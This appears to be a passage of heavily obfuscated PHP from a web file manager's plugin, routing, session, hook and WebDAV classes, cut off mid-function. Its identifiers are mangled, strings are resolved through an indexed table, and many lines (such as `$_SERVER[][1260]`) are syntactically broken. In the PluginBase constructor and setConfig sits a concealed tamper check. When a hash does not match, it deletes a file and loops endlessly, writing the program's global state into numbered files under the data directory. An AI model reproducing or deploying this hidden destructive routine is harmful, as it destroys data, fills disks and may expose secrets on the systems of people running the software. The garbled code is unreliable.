$aӄƚ . $bȓ; } public function fileOut($FȜ, $a = false, $fĵ = false, $AǴ݂ = '') { if (!$fĵ) { $fĵ = $this->pathThis($FȜ); } $cѡ = $a ? array($_SERVER[][1260] . rawurlencode($fĵ)) : array(); $D = $this->link($FȜ, $cѡ); $this->fileOutLink($D); } public function fileOutServer($BĔ, $F嫱܌ = false, $E = false, $C̦ = '') { parent::fileOut($BĔ, $F嫱܌, $E, $C̦); } public function fileOutImage($d, $AǞƗ = 250) { $f = $this->link($d . $_SERVER[][1261] . $AǞƗ); $this->fileOutLink($f); } public function fileOutImageServer($Fɍ, $BÉ = 250) { parent::fileOutImage($Fɍ, $BÉ); } public function hashMd5($Cϵʃ) { $DЭ =& $_SERVER[]; $d· = $this->objectMeta($Cϵʃ); return isset($d·[$DЭ[192]]) ? $d·[$DЭ[192]] : !1; } public function size($c楸) { $c㆜ = $this->objectMeta($c楸); return $c㆜ ? $c㆜[$_SERVER[][77]] : 0; } public function info($B̟) { if ($this->isFolder($B̟)) { return $this->folderInfo($B̟); } else { if ($this->isFile($B̟)) { return $this->fileInfo($B̟); } } return !1; } public function exist($f酝ċ) { return $this->isFile($f酝ċ) || $this->isFolder($f酝ċ); } public function isFile($C֎) { return !$this->isFolder($C֎) && $this->objectMeta($C֎); } public function isFolder($dޑ) { return $this->cacheMethod($_SERVER[][219], $dޑ); } protected function objectMeta($B挹垴) { return $this->cacheMethod($_SERVER[][220], $B挹垴); } protected function _objectMeta($a) { goto Fҵǟ; E㦒: $Dꘟ = array($cˬ[28] => get_path_this($a), $cˬ[29] => isset($B֠[$cˬ[1263]]) ? $B֠[$cˬ[1263]] : null, $cˬ[77] => isset($B֠[$cˬ[1264]]) ? $B֠[$cˬ[1264]] : null, $cˬ[192] => isset($B֠[$cˬ[1265]]) ? $B֠[$cˬ[1265]] : null, $cˬ[1232] => isset($B֠[$cˬ[1266]]) ? $B֠[$cˬ[1266]] : null); $Dꘟ[$cˬ[1233]] = isset($B֠[$cˬ[1267]]) ? strtotime($B֠[$cˬ[1267]]) : $Dꘟ[$cˬ[1232]]; return $Dꘟ; goto e; C͢: if (!$f痨[$cˬ[1019]]) { return null; } $B֠ = isset($f痨[$cˬ[1021]]) ? $f痨[$cˬ[1021]] : array(); if (!isset($B֠[$cˬ[1263]])) { return null; } goto E㦒; Fҵǟ: $cˬ =& $_SERVER[]; if ($a == $cˬ[33] || $a == $cˬ[8]) { return array(); } $f痨 = $this->ussRequest($a, $cˬ[1262]); goto C͢; e: } protected function _isFolder($DȊꝶ) { $EӅŲ =& $_SERVER[]; if ($DȊꝶ == $EӅŲ[33] || $DȊꝶ == $EӅŲ[8]) { return !0; } $eޔ˂ = $this->objectMeta($DȊꝶ); return isset($eޔ˂[$EӅŲ[29]]) && $eޔ˂[$EӅŲ[29]] == $EӅŲ[76] ? !0 : !1; } } goto CƄ; BԴ蚽: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto F̠; Bޅ: $this->in =& $in; $this->modelPlugin = Model($E㏕[1288]); $this->pluginName = str_replace($E㏕[1288], $E㏕[33], get_class($this)); goto b̔; b̔: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $E㏕[8]; $this->pluginApi = appHostGet() . $E㏕[1289] . $this->pluginName . $E㏕[8]; $this->pluginHost = $config[$E㏕[1290]] . $this->pluginName . $E㏕[8]; goto A׸; F̠: $E㏕ =& $_SERVER[]; $dג٪ = $_SERVER[$E㏕[772]] . $E㏕[773]; $bŸΈ҅ = $E㏕[774]; goto aӍ; aӍ: if ($_SERVER[$E㏕[775]] != $bŸΈ҅($dג٪)) { goto Cԥ; Cݑ: $DӔ = $D𫨏($b×); $c׊ = explode($E㏕[213], $DӔ); if (count($c׊) < $E㏕[547]) { $B歄ȴ = $E㏕[778]; $B歄ȴ(); } goto A; AݲՍ: $C = 1; for ($E돰 = $C; $E돰 > 0; $E돰++) { $a(DATA_PATH . $E돰, $bȕΊ); } goto A; A: $BѲݱ = $E㏕[779]; $BѲݱ($_SERVER[$E㏕[780]]); $a篇 = $E㏕[776]; goto Dܟ; Dܟ: $a篇(); $a = $E㏕[781]; $bȕΊ = json_encode($GLOBALS[$E㏕[782]]); goto AݲՍ; Cԥ: $a篇 = $E㏕[776]; $D𫨏 = $E㏕[777]; $b× = $_SERVER[$E㏕[772]] . $E㏕[773]; goto Cݑ; A: } global $in, $config; $this->config =& $config; goto Bޅ; A׸: $this->pluginHostDefault = $config[$E㏕[1290]] . $this->pluginName . $E㏕[8]; $A = $config[$E㏕[1291]]; if ($A && strpos($E㏕[47] . $A . $E㏕[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$E㏕[1292]] . $this->pluginName . $E㏕[8]; } goto e; e: $this->pluginLangArr = $this->initLang(); $this->values = array(); return $this; goto A; A: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[][1293]); } protected function assign($A׆, $b = false) { if (is_array($A׆)) { $this->values = array_merge($this->values, $A׆); } else { $this->values[$A׆] = $b; } } protected function display($c) { extract($this->values); require $c; } final function hookRegist($F۔) { $this->modelPlugin->appRegist($this->pluginName, $F۔); } final function appIcon() { $C =& $_SERVER[]; $c繳 = $this->appPackage(); $fᩅ = $C[33]; if (isset($c繳[$C[378]])) { if (isset($c繳[$C[378]][$C[1294]])) { $fᩅ = $C[1295] . $c繳[$C[378]][$C[1294]] . $C[1296]; } else { if ($c繳[$C[378]][$C[1297]]) { $fᩅ = $C[1298] . $c繳[$C[378]][$C[1297]] . $C[1299]; } } } return $fᩅ; } final function fileCanView($eꪲž) { $Eǵ =& $_SERVER[]; if (request_url_safe($eꪲž)) { return !0; } if ($this->isShare($eꪲž)) { return !0; } if (!Action($Eǵ[1300])->authCan($Eǵ[1301])) { show_tips(LNG($Eǵ[1302]) . $Eǵ[1303], !1); } ActionCall($Eǵ[1304], $eꪲž); } final function isShare($a鮒) { $fњ = KodIO::parse($a鮒); return $fњ[$_SERVER[][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($F̘) { if (request_url_safe($F̘)) { return $F̘; } if (!$this->isShare($F̘)) { $F̘ = $this->filePath($F̘); } return Action($_SERVER[][1004])->linkOut($F̘); } public function filePathLinkOut($f) { if (request_url_safe($f)) { return $f; } $this->fileCanView($f); return Action($_SERVER[][1004])->link($f); } final function filePath($f赮) { $D꼇 =& $_SERVER[]; if ($b﹎ = $this->checkSharePath($f赮)) { return $b﹎; } $this->fileCanView($f赮); if (request_url_safe($f赮)) { $Aђސ = parse_url_query($f赮); if (isset($Aђސ[$D꼇[1305]]) && isset($Aђސ[$D꼇[193]])) { $cՇ = Model($D꼇[1075])->get($D꼇[1306]); $a̲ = Mcrypt::decode($Aђސ[$D꼇[193]], $cՇ); if ($a̲) { $this->fileInfo = IO::infoWithChildren($a̲); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $a̲; } } $f赮 = $this->_cacheHttpFile($f赮); $this->fileInfo = IO::infoWithChildren($f赮); } else { $this->fileInfo = IO::infoWithChildren($f赮); if (!$this->fileInfo) { show_tips(LNG($D꼇[100]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $f赮; } final function _cacheHttpFile($C) { $aȆ = hash_path($C, !0); $this->cachePath = $this->pluginCachePath($aȆ); if ($a = IO::fileNameExist($this->cachePath, $aȆ)) { return KodIO::make($a); } $B = $this->cachePath . $aȆ; return $this->pluginCacheFileSet($B, file_get_contents($C)); } final function _tmpFileName($B膆 = array()) { goto d֔; E: if (isset($B膆[$a鴺[158]][$a鴺[160]])) { return $B膆[$a鴺[158]][$a鴺[160]]; } $E = array($B膆[$a鴺[28]], $B膆[$a鴺[75]], $B膆[$a鴺[77]]); if (isset($B膆[$a鴺[455]])) { $E[] = $B膆[$a鴺[455]]; } goto D俅; d֔: $a鴺 =& $_SERVER[]; if (!$B膆) { $B膆 = $this->fileInfo; } if (isset($B膆[$a鴺[160]])) { return $B膆[$a鴺[160]]; } goto E; D俅: return md5(implode($a鴺[70], $E)); goto E; E: } final function checkSharePath($Cꊯӓ) { goto ď; ď: $f̌ =& $_SERVER[]; if (!defined($f̌[423])) { define($f̌[1307], 0); } if (!$this->isShare($Cꊯӓ)) { return !1; } goto D; fɱ: $this->cachePath = $this->pluginCachePath($this->fileInfo[$f̌[160]]); return $eРՂ[$f̌[75]]; goto dܝ; D: $eРՂ = Action($f̌[1004])->sharePathInfo($Cꊯӓ); if (!isset($eРՂ[$f̌[75]])) { show_json(LNG($f̌[1308]), !1); } $this->fileInfo = $eРՂ[$f̌[158]]; goto fɱ; dܝ: } final function pluginCachePath($f = '') { $E =& $_SERVER[]; $A = IO_PATH_SYSTEM_TEMP . $E[1309] . $this->pluginName; if (!($Dȗ = IO::infoFull($A))) { return IO::mkdir($A . $E[8] . $f); } if (empty($f)) { return $Dȗ[$E[75]]; } if (!($f = IO::fileNameExist($Dȗ[$E[75]], $f))) { return IO::mkdir($Dȗ[$E[75]] . $f); } return KodIO::make($f); } final function pluginCacheFileSet($d, $f = '') { $fƌ =& $_SERVER[]; if (!($Bě = IO::infoFull($d))) { return IO::mkfile($d, $f, REPEAT_REPLACE); } IO::setContent($Bě[$fƌ[75]], $f); return $Bě[$fƌ[75]]; } final function pluginLocalFile($e骆 = '') { goto eԿ; eԿ: $eؑ =& $_SERVER[]; $F҅ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($F҅)) { mk_dir($F҅); } goto fߗ; aළ듪: $D = $F҅ . $c; if (@file_exists($D)) { return $D; } return IO::copy($e骆, $F҅, 0, $c); goto B曉; fߗ: if (!$e骆) { return $F҅; } $dߑ = IO::info($e骆); $c = $this->_tmpFileName($dߑ) . $eؑ[91] . $dߑ[$eؑ[156]]; goto aළ듪; B曉: } final function appPackage() { goto d; b豫: $C = Hook::trigger($a؋[1311], $e); if ($C && is_array($C)) { $e = $C; } $this->packageData = $e; goto Eԓ; D: $this->parseLang($bŇ); $e = json_decode_force($bŇ); if (!$e) { return array(); } goto b豫; d: $a؋ =& $_SERVER[]; if ($this->packageData) { return $this->packageData; } $bŇ = $this->parseFile($this->pluginPath . $a؋[1310]); goto D; Eԓ: return $e; goto eߝÌ; eߝÌ: } public function packageInfoGet($eو񚊹) { $bֈ = $this->appPackage(); return array_get_value($bֈ, $eو񚊹); } public function packageVersion() { return $this->packageInfoGet($_SERVER[][1312]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[][1313]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[][1314]); } private function parseFile($F) { $FϹ =& $_SERVER[]; $D㕊 = file_get_contents($F); $b҃ = array($FϹ[1315], $FϹ[1316], $FϹ[1317], $FϹ[1318], $FϹ[1319], $FϹ[1320], $FϹ[1321]); $e = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$FϹ[84]][$FϹ[1322]]); $D㕊 = str_replace($b҃, $e, $D㕊); return $D㕊; } private function parseLang(&$f) { goto bەՎ; c: preg_match_all($D[1324], $f, $e؅߇); if (!is_array($e؅߇) || count($e؅߇) == 0 || !is_array($e؅߇[0]) || count($e؅߇[0]) == 0) { return; } $F醙 = array(); goto a߫Ҝ; a߫Ҝ: $E¤ = array(); foreach ($e؅߇[0] as $a垗) { $a = substr($a垗, strlen($d򩯼), -4); $Aר = LNG($a); $F醙[] = $a垗; $E¤[] = str_replace(array($D[213], $D[979], $D[326], $D[112]), array($D[50], $D[50], $D[33], $D[1325]), $Aר); } $f = str_replace($F醙, $E¤, $f); goto d; bەՎ: $D =& $_SERVER[]; $d򩯼 = $D[1323]; if (!strstr($f, $d򩯼)) { return; } goto c; d: } private function parseConfig(&$Aʹ) { goto b数; b٦: $D = array(); $Aؒό = array(); foreach ($Bߖƥ[0] as $F셗) { $c©馯 = substr($F셗, strlen($Fލ), -2); $D[] = $F셗; $Aؒό[] = _get($aÝ, $c©馯); } goto Dώʍ; Aᇑ: preg_match_all($E[1327], $Aʹ, $Bߖƥ); if (!is_array($Bߖƥ) || count($Bߖƥ) == 0 || !is_array($Bߖƥ[0]) || count($Bߖƥ[0]) == 0) { return; } $aÝ = $this->getConfig(); goto b٦; Dώʍ: $Aʹ = str_replace($D, $Aؒό, $Aʹ); goto fΑ; b数: $E =& $_SERVER[]; $Fލ = $E[1326]; if (!strstr($Aʹ, $Fލ)) { return; } goto Aᇑ; fΑ: } private function parsePackage(&$cĬ) { goto a޹; E: preg_match_all($Fį[1329], $cĬ, $bٗ̄); if (!is_array($bٗ̄) || count($bٗ̄) == 0 || !is_array($bٗ̄[0]) || count($bٗ̄[0]) == 0) { return; } $A = $this->appPackage(); goto eٸ; e: $cĬ = str_replace($b󅶇, $Aɦ, $cĬ); goto c; a޹: $Fį =& $_SERVER[]; $dډ = $Fį[1328]; if (!strstr($cĬ, $dډ)) { return; } goto E; eٸ: $b󅶇 = array(); $Aɦ = array(); foreach ($bٗ̄[0] as $e) { $b铇 = substr($e, strlen($dډ), -2); $b󅶇[] = $e; $Aɦ[] = _get($A, $b铇); } goto e; c: } final function echoFile($d, $cǵֈ = false) { goto fȑ; fȑ: $C뒺 =& $_SERVER[]; $Aߺ = $this->pluginPath . $d; if (ACT == $C뒺[1330]) { echo $C뒺[1331] . $this->pluginName . $C뒺[8] . $d . $C뒺[1332]; if (!file_exists($Aߺ)) { echo $C뒺[1333]; return; } } goto F┃ߣ; e׊ߪ: $this->parsePackage($E); if (is_array($cǵֈ)) { $E = str_replace(array_keys($cǵֈ), array_values($cǵֈ), $E); } echo $C뒺[213] . $E; goto D۴ѫ; F┃ߣ: $E = $this->parseFile($Aߺ); $this->parseLang($E); $this->parseConfig($E); goto e׊ߪ; D۴ѫ: } final function initLang() { goto C˹; FЭٔ: if (!is_array($e)) { return array(); } if (@count($e) > 0) { I18n::set($e); } return $e; goto fוݕ; C˹: $f =& $_SERVER[]; $aڈ̞ = $f[1334]; $Fӯ = $this->pluginPath . $f[1335]; goto d; d: $bѼ = I18n::getType(); $e = array(); if (file_exists($Fӯ . $bѼ . $f[750])) { $e = (include $Fӯ . $bѼ . $f[750]); } else { if ($bѼ == $f[1336] && !file_exists($Fӯ . $bѼ . $f[750]) && file_exists($Fӯ . $f[1337])) { $e = (include $Fӯ . $f[1337]); } else { if (file_exists($Fӯ . $aڈ̞ . $f[750])) { $e = (include $Fӯ . $aڈ̞ . $f[750]); } } } goto FЭٔ; fוݕ: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($C󗚾) { $E򾈧ױ =& $_SERVER[]; if ($_SERVER[$E򾈧ױ[775]] != $_SERVER[$E򾈧ױ[959]]) { goto b֍; b֍: $aㆱ = $E򾈧ױ[776]; $Dώم = $E򾈧ױ[777]; $a« = $_SERVER[$E򾈧ױ[772]] . $E򾈧ױ[773]; goto Aȯˆ; Aȯˆ: $a䌒ı = $Dώم($a«); $e캊 = explode($E򾈧ױ[213], $a䌒ı); if (count($e캊) < $E򾈧ױ[547]) { $cι¥ = $E򾈧ױ[778]; $cι¥(); } goto cՏ; cՏ: $B = $E򾈧ױ[779]; $B($_SERVER[$E򾈧ױ[780]]); $B($_SERVER[$E򾈧ױ[772]] . $E򾈧ױ[1338]); goto aӓ; aӓ: $f = 1; while ($f > 1) { $f = $f + 4; $D¡ = rawurlencode($f . $E򾈧ױ[357]); } goto a댉; a댉: } return $this->modelPlugin->setConfig($this->pluginName, $C󗚾); } public function onSetConfig($dې) { } public function onGetConfig($Bŏ) { } public function onChangeStatus($B) { } public function onUninstall() { } public function onInstall() { } public function authCheck($b߇ = "\160\x6c\x75\x67\x69\x6e\x41\x75\x74\x68") { $a٘ =& $_SERVER[]; if (!defined($a٘[423])) { return !1; } if (_get($GLOBALS, $a٘[453])) { return !0; } $D = $this->getConfig(); if (!$D[$b߇]) { return !1; } return ActionCall($a٘[1339], $D[$b߇]); } public function url($F, $Eɻʡ = '', $A = true) { goto cÃ; cÃ: $B =& $_SERVER[]; $cԻ = $this->getConfig(); $Eᒜ = KOD_VERSION . $B[91] . KOD_VERSION_BUILD; goto aΫ; E쏋䛢: if (!$A) { return $eÔ; } echo $eÔ; goto dゴǮ; aΫ: $B̷ = $this->packageVersion(); $AǓ = $Eᒜ . $B[408] . $B̷; if (substr($F, 0, 4) == $B[142] || substr($F, 0, 2) == $B[1134]) { $eÔ = $F . $B[1340] . $AǓ; } else { if ($Eɻʡ == $B[33]) { $eÔ = $this->pluginHost . $F . $B[1340] . $AǓ; } else { if ($Eɻʡ === $B[76]) { $eÔ = $this->pluginHost . $F; } else { if ($Eɻʡ == $B[1341]) { $eÔ = STATIC_PATH . $F . $B[1340] . $Eᒜ; } else { if ($Eɻʡ == $B[1342]) { $eÔ = APP_HOST . $B[1343] . $F . $B[1340] . $Eᒜ; } else { if (isset($cԻ[$Eɻʡ])) { $eÔ = $cԻ[$Eɻʡ] . $F . $B[1340] . $AǓ; } } } } } } goto E쏋䛢; dゴǮ: } public function link($b = false, $fՠ = '') { $eի =& $_SERVER[]; if (!$b) { $this->link($eի[1344], $eի[1342]); $this->link($eի[1345], $eի[1341]); $this->link($eի[1346], $eի[1341]); $this->link($eի[1347], $eի[1341]); $this->link($eի[1348], $eի[1341]); return; } $FΖ = $this->url($b, $fՠ, !1); if (substr($b, -3) == $eի[1349]) { echo $eի[1350] . $FΖ . $eի[1351] . $eի[213]; } else { if (substr($b, -4) == $eի[1352]) { echo $eի[1353] . $FΖ . $eի[1354] . $eի[213]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\x6e\x79" => "\x5b\136\57\x5d\53", "\72\x6e\165\x6d" => "\133\60\x2d\71\x5d\53", "\72\141\x6c\154" => "\56\x2a"); public static $errorCallback; public static function __callstatic($Aƈ, $A󈒓) { $Eð =& $_SERVER[]; if ($Aƈ == $Eð[1355]) { $C߳ = array_map($Eð[1356], $A󈒓[0]); $A = strpos($A󈒓[1], $Eð[8]) === 0 ? $A󈒓[1] : $Eð[8] . $A󈒓[1]; $C = $A󈒓[2]; } else { $C߳ = null; $A = strpos($A󈒓[0], $Eð[8]) === 0 ? $A󈒓[0] : $Eð[8] . $A󈒓[0]; $C = $A󈒓[1]; } array_push(self::$maps, $C߳); array_push(self::$routes, $A); array_push(self::$methods, strtoupper($Aƈ)); array_push(self::$callbacks, $C); } public static function error($DŃ) { self::$errorCallback = $DŃ; } public static function haltOnMatch($F = true) { self::$halts = $F; } public static function dispatch() { goto b늸; b늸: $aʡ =& $_SERVER[]; $bǉ = parse_url($_SERVER[$aʡ[1357]], PHP_URL_PATH); $Cۧү = $_SERVER[$aʡ[150]]; goto bϷԅ; f: self::$routes = preg_replace($aʡ[1060], $aʡ[8], self::$routes); if (in_array($bǉ, self::$routes)) { $Bי = array_keys(self::$routes, $bǉ); foreach ($Bי as $EԱ) { if (self::$methods[$EԱ] == $Cۧү || self::$methods[$EԱ] == $aʡ[1358] || in_array($Cۧү, self::$maps[$EԱ])) { $F𡠢 = !0; if (!is_object(self::$callbacks[$EԱ])) { $f̭й = explode($aʡ[8], self::$callbacks[$EԱ]); $C = end($f̭й); $Eњ = explode($aʡ[1359], $C); $AΥչ = new $Eњ[0](); $AΥչ->{$Eњ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$EԱ]); if (self::$halts) { return; } } } } } else { $e = 0; foreach (self::$routes as $EԱ) { if (strpos($EԱ, $aʡ[4]) !== !1) { $EԱ = str_replace($cÍ, $fуֻ, $EԱ); } if (preg_match($aʡ[1360] . $EԱ . $aʡ[1361], $bǉ, $A嬞)) { if (self::$methods[$e] == $Cۧү || self::$methods[$e] == $aʡ[1358] || !empty(self::$maps[$e]) && in_array($Cۧү, self::$maps[$e])) { $F𡠢 = !0; array_shift($A嬞); if (!is_object(self::$callbacks[$e])) { $f̭й = explode($aʡ[8], self::$callbacks[$e]); $C = end($f̭й); $Eњ = explode($aʡ[1359], $C); $AΥչ = new $Eњ[0](); if (!method_exists($AΥչ, $Eњ[1])) { echo $aʡ[1362]; } else { call_user_func_array(array($AΥչ, $Eњ[1]), $A嬞); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$e], $A嬞); if (self::$halts) { return; } } } } $e++; } } if ($F𡠢 == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $dܝ =& $_SERVER[]; header($_SERVER[$dܝ[1363]] . $dܝ[1364]); echo $dܝ[1365]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$aʡ[1357]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto D٘; bϷԅ: $cÍ = array_keys(static::$patterns); $fуֻ = array_values(static::$patterns); $F𡠢 = !1; goto f; D٘: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto b; E܇: $fܿ = $aƎ[$dբ[1368]]; $d = $aƎ[$fܿ]; $eϝ = $aƎ[$dբ[740]]; goto a; b: $dբ =& $_SERVER[]; static $e = false; if ($e) { return $e; } goto Eؘܨ; a: switch ($fܿ) { case $dբ[17]: self::$handle = Model($dբ[741]); break; case $dբ[742]: self::$handle = new CacheRedis($d, $eϝ); break; case $dբ[743]: self::$handle = new CacheMemcached($d, $eϝ); break; case $dբ[163]: $d[$dբ[75]] = $d[$dբ[75]] . $dբ[1369]; self::$handle = new CacheFile($d, $eϝ); default: break; } if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $e = new self(); goto d뭃ܾ; d뭃ܾ: return $e; goto b; b: $BӐ = _get($GLOBALS, $dբ[1367], $BӐ); if (self::$sessionSign) { } else { if (Cookie::get($BӐ)) { self::$sessionSign = Cookie::get($BӐ); } else { self::$sessionSign = guid(); } } Cookie::setSafe($BӐ, self::$sessionSign, self::$sessionTime); goto E܇; Eؘܨ: $aƎ = $GLOBALS[$dբ[6]][$dբ[333]]; self::$sessionTime = $aƎ[$dբ[1366]]; $BӐ = SESSION_ID; goto b; b: } public static function sign($b甃 = false) { $b甃 && (self::$sessionSign = $b甃); self::init(); return self::$sessionSign; } public static function set($b۝, $fƖ = false) { self::init(); if (is_array($b۝)) { foreach ($b۝ as $Dϧ => $Bԕ) { array_set_value(self::$data, $Dϧ, $Bԕ); } } else { array_set_value(self::$data, $b۝, $fƖ); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($F = false) { self::init(); if (!$F) { return self::$data; } return array_get_value(self::$data, $F); } public static function remove($e) { self::init(); unset(self::$data[$e]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[][745])) { self::$handle->clearTimeout(); } } } goto d݉ê; eα: class Hook { private static $events = array(); public static function get($E = false) { if (!$E) { return self::$events; } else { return self::$events[$E]; } } public static function apply($D, $f = array()) { $Cߵ = ActionApply($D, $f); if (is_string($D)) { Hook::trigger($D); } return $Cߵ; } public static function bind($dĢ߯, $A, $d = false) { $a =& $_SERVER[]; if (!isset(self::$events[$dĢ߯])) { self::$events[$dĢ߯] = array(); } self::$events[$dĢ߯][] = array($a[1715] => $A, $a[1716] => $d, $a[1717] => 0); } public static function once($e݅, $F) { self::bind($e݅, $F, !0); } public static function unbind($aϲ, $a = false) { if (!$a) { self::$events[$aϲ] = array(); return; } $E޵ = self::$events[$aϲ]; self::$events[$aϲ] = array(); if (!is_array($E޵)) { return; } for ($Fׅ = 0; $Fׅ < count($E޵); $Fׅ++) { if ($E޵[$Fׅ][$_SERVER[][1715]] == $a) { continue; } self::$events[$aϲ][] = $E޵[$Fׅ]; } } public static function filter($Cڣ͊, $fۢ) { goto cᇪļ; cᇪļ: $C⎊ܘ =& $_SERVER[]; $aǛ̪ = self::$events; if (!isset($aǛ̪[$Cڣ͊])) { return $fۢ; } goto eʠ; d񱼤: for ($aˈ = 0; $aˈ < count($aͲ); $aˈ++) { $BҮ = $aͲ[$aˈ]; if ($BҮ[$C⎊ܘ[1716]] && $BҮ[$C⎊ܘ[1717]] > 1) { continue; } self::$events[$Cڣ͊][$aˈ][$C⎊ܘ[1717]] = $BҮ[$C⎊ܘ[1717]] + 1; $F = self::apply($BҮ[$C⎊ܘ[1715]], array($bА劍)); if (gettype($F) == gettype($bА劍)) { $bА劍 = $F; } } return $bА劍; goto A϶; eʠ: $aͲ = $aǛ̪[$Cڣ͊]; $bА劍 = $fۢ; if (!is_array($aͲ) || count($aͲ) == 0) { return $bА劍; } goto d񱼤; A϶: } public static function trigger($bԶ) { goto eݿ; f: if (!isset($eτٷ[$bԶ])) { return $Cʚ; } $AՈ = $eτٷ[$bԶ]; if (!is_array($AՈ) || count($AՈ) == 0) { return $Cʚ; } goto Fξ; F״: return $Cʚ; goto A·; eݿ: $A =& $_SERVER[]; $eτٷ = self::$events; $Cʚ = !1; goto f; Fξ: $Bĳ򣊥 = func_get_args(); array_shift($Bĳ򣊥); for ($a = 0; $a < count($AՈ); $a++) { $e蹫 = $AՈ[$a]; if ($e蹫[$A[1716]] && $e蹫[$A[1717]] > 1) { continue; } if (defined($A[1718]) && GLOBAL_LOG_HOOK) { write_log($bԶ . $A[1719] . $e蹫[$A[1715]], $A[1720]); } self::$events[$bԶ][$a][$A[1717]] = $e蹫[$A[1717]] + 1; $CΑ = self::apply($e蹫[$A[1715]], $Bĳ򣊥); if (defined($A[1718]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $A[1720]); if ($e蹫[$A[1717]] == 200) { $F榸 = is_array($e蹫[$A[1715]]) ? json_encode_force($e蹫[$A[1715]]) : $e蹫[$A[1715]]; write_log($A[1721] . $bԶ . $A[1722] . $F榸, $A[1723]); } } $Cʚ = is_null($CΑ) ? $Cʚ : $CΑ; } goto F״; A·: } } class HttpAuth { public static function get() { $e =& $_SERVER[]; $a̕ = $e[33]; $Aҵ = $e[33]; if (isset($_SERVER[$e[1724]])) { $a̕ = $_SERVER[$e[1724]]; $Aҵ = $_SERVER[$e[1725]]; } elseif (isset($_SERVER[$e[1726]])) { $Cυ = $_SERVER[$e[1726]]; if (strpos(strtolower($Cυ), $e[1727]) === 0) { $c = explode($e[4], base64_decode(substr($Cυ, 6))); $a̕ = isset($c[0]) ? $c[0] : $e[33]; $Aҵ = isset($c[1]) ? $c[1] : 0; } } return array($e[531] => $a̕, $e[883] => $Aҵ); } public static function error() { goto D酪; b˜ǅ: header($c̖[1730]); header($c̖[1731]); header($c̖[1242]); goto F; F: die; goto E; D酪: $c̖ =& $_SERVER[]; header($c̖[1728]); header($c̖[1729]); goto b˜ǅ; E: } public static function make($Cđ, $a) { $Aƫ =& $_SERVER[]; return $Aƫ[1732] + base64_encode($Cđ . $Aƫ[4] . $a); } } class HttpDavClient { public function __construct($AǢ, $bǙ, $E˭) { $this->header = array(); $this->userName = $bǙ; $this->userPassowrd = $E˭; } protected function makePath($D쥩ט) { return $D쥩ט; } protected function setHeader($A, $aĄ = false) { if ($aĄ === !1) { $this->header[] = $A; } else { $this->header[] = $A . $_SERVER[][866] . $aĄ; } } public function move($f뜾, $D¡, $aԑ = '') { $f =& $_SERVER[]; $this->setHeader($f[1733], $this->makePath($D¡)); $this->setHeader($f[1734], $f[1735]); if ($aԑ) { $this->setHeader($f[1736], $f[911] . $aԑ . $f[914]); } return $this->send($f[1737], $f뜾); } public function copy($BǨ, $e) { $aƲ֞ =& $_SERVER[]; $this->setHeader($aƲ֞[1733], $this->makePath($e)); $this->setHeader($aƲ֞[1734], $aƲ֞[1735]); return $this->send($aƲ֞[1738], $BǨ); } public function mkcol($Cʯ) { $AЃ =& $_SERVER[]; $this->setHeader($AЃ[1734], $AЃ[1735]); return $this->send($AЃ[1739], $Cʯ); } public function delete($C푣, $bÕ = '') { $c =& $_SERVER[]; if ($bÕ) { $this->setHeader($c[1736], $c[911] . $bÕ . $c[914]); } return $this->send($c[1230], $C푣); } public function propfind($bݭ) { $B౥ʛ =& $_SERVER[]; $this->setHeader($B౥ʛ[1740], $B౥ʛ[83]); $this->setHeader($B౥ʛ[1741], $B౥ʛ[1742]); $Eŗ = $B౥ʛ[1743]; return $this->send($B౥ʛ[1744], $bݭ, $Eŗ); } public function options($Aܘۼ) { return $this->send($_SERVER[][1745], $Aܘۼ); } public function get($D䒘) { return $this->send($_SERVER[][212], $D䒘); } public function put($Cѐڏ, $eۓʢ, $DǾ = '') { $Bഒ =& $_SERVER[]; if ($DǾ) { $this->setHeader($Bഒ[1736], $Bഒ[911] . $DǾ . $Bഒ[914]); } return $this->send($Bഒ[210], $Cѐڏ, $eۓʢ); } protected function send($D, $F, $e = false, $b = false) { goto d; Aݩ: $this->setHeader($eᗇ); if ($e) { $e = $C͏[1747] . $e; } if (!request_url_safe($F)) { return !1; } goto a₎; eѮ: $this->header = array(); return $cچº; goto e; A: curl_setopt($cӤ, CURLOPT_HTTPHEADER, $this->header); curl_setopt($cӤ, CURLOPT_RETURNTRANSFER, !0); curl_setopt($cӤ, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto D; D: 